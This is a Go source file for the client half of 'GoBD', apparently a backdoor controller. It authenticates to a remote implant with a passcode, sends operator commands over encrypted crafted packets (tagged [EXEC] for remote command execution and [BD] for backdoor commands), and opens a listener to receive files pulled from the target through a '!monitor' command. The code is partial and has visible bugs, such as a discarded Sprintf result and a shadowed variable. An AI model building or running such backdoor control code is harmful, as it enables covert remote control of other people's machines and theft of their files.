package main

import(
	"os"
	"io"
	"encoding/binary"
	"fmt"
	"strings"
	"bufio"
	"golang.org/x/crypto/ssh/terminal"
	"runtime"
	"net"
)

/* 
    FUNCTION: func intiateClient(ip string, port, lport in)
    RETURNS: Nothing
    ARGUMENTS: 
                string ip : the ip address of the server
                int port : port to send data to
                int lport : port to listen for data on

    ABOUT:
    Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
    server if correct. Then idles waiting for user input and server output. Also provides help documentation
*/
func intiateClient(ip string, port, lport uint16){
	
	for {
		fmt.Print("Please input the authentication code: ");
		var authstr string;
		if runtime.GOOS == "windows" {
			reader := bufio.NewReader(os.Stdin);
			authstr, _ := reader.ReadString('\n');
			authstr = strings.TrimSpace(authstr);
		} else {			
			authcode, _ := terminal.ReadPassword(0);
			authstr = string(authcode);
		}
		
		if authstr == passwd {
			sendAuthPacket(ip, authstr, port)
			break;
		}
		fmt.Print("\nInvalid authentication code, try again.\n");
	}
 
	fmt.Printf("Authentication accepted, you may now send commands.\n");
	fmt.Printf("Type ?help for more info on sending client commands.\n");

	go beginListen(ip, port, lport)
	
	for {
		reader := bufio.NewReader(os.Stdin);
		input, _ := reader.ReadString('\n');
		input = strings.TrimSpace(input);
		if strings.HasPrefix(input, "!") {
			sendEncryptedData(port, "[BD]" + input, ip);
			if strings.HasPrefix(input, "!monitor") {
				args := strings.Split(input, " ");
				go fileWait(ip, args[1], lport + 1)
			}
		} else if input == "?help" {
			fmt.Print(helpStr);
			continue;
		} else {
			sendEncryptedData(port, "[EXEC]" + input, ip);
		}
	}
}


func clientControl(val uint16, sIP string, port, lport uint16, buffer []byte) []byte{
	if sIP  == localip.String() && port == lport {
		curr_bytes := buffer[i:i + 1]
		binary.LittleEndian.PutUint16(curr_bytes, val)
		i = i + 2

		if(port == SND_CMPLETE){
			fmt.Print(buffer[:(len(buffer) - 1)])
			buffer = buffer[:0]
			i = 0
		}
	}

	return buffer
}


func sendAuthPacket(ip, authstr string, port uint16){

	cryptdata := encrypt_data(authstr)

	bbuffer := craftPacket([]byte{4,4,3,2}, ip, port, cryptdata)
	
	err := handle.WritePacketData(bbuffer);
	checkError(err)
}

func fileWait(ip, filename string, lport uint16){

	var addr string
	fmt.Sprintf(addr, "%s:%d", ip, lport)
	ln, _ := net.Listen("tcp", addr)

	connection, _ := ln.Accept()

	fileBuffer := make([]byte, 1000)
	var currentByte int64 = 0
	
	file, err := os.Create(strings.TrimSpace(filename))
	checkError(err)
	
	for {
		connection.Read(fileBuffer)
		_, err = file.WriteAt(fileBuffer, currentByte)

		currentByte += 1000

		if err == io.EOF {
			break
		}
	}
	
	file.Close()
}
